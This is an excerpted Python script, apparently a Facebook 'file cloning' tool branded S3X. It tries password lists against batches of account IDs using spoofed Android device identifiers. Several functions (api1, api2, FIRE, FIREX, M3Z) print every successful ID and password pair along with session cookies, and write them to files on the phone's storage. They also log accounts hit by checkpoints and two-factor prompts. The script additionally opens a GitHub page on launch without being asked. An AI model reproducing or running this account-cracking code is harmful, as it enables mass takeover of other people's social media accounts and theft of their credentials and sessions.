...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mSEX-/UPDATE\33[1;91m⊁ ')
...
def arfan1():
        ...
        return ua
#-----------------------------------------------------#
os.system("xdg-open https://github.com/masum-cyber-404")

logo=("""  ________  ____  ____  ____    ____  
|_   __  ||_  _||_  _||_   \  /   _| 
  | |_ \_|  \ \  / /    |   \/   |   
  |  _| _    > `' <     | |\  /| |   
 _| |__/ | _/ /'`\ \_  _| |_\/_| |_  
|________||____||____||_____||_____| 
 ...
 ─────────────────────────────────────────────
 DEVELOPER    \33[1;91m ◉     \x1b[38;5;48mS3X-/MASUM	  
 FACEBOOK \33[1;91m     ◉     \x1b[38;5;208mMD MASUM AHMED	 	
 GITHUB     \33[1;91m   ◉    \x1b[38;5;47m MASUM-AHMED  	\33[1;91m[\33[1;95mS3X\33[1;91m]
 ─────────────────────────────────────────────
\33[1;97m\33[42m[\33[1;91mTOOLS\x1b[38;5;208m: \33[1;97mFREE FILE CLONING TOOLS VERSION \33[1;95m-0.1\33[1;97m]\x1b[0m
\33[1;92m─────────────────────────────────────────────
""")
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m FILE NAME : /sdcard/S3X.txt  etc..')
				linex()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bS3X}[{G}S3X-M2{bS3X}]-[{G}%s{bS3X}]-[{G}OK:%s{bS3X}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bS3X}[{G}LIVE-OK{bS3X}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/S3X-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[S3X-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[S3X-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/S3X-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/S3X-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bS3X}[{G}S3X-M1{bS3X}]-[{G}%s{bS3X}]-[{G}OK:%s{bS3X}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mS3X-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bS3X}[{G}LIVE-OK{bS3X}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bS3X}[{G}•{bS3X}]{G} '+kuki+'')
                linex()
                open('/sdcard/S3X-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mS3X-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bS3X}[{G}•{bS3X}]{G} '+kuki+'')
                linex()
                open('/sdcard/S3X-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mS3X-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bS3X}[{G}•{bS3X}]{G} '+kuki+'')
                linex()
                open('/sdcard/S3X-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
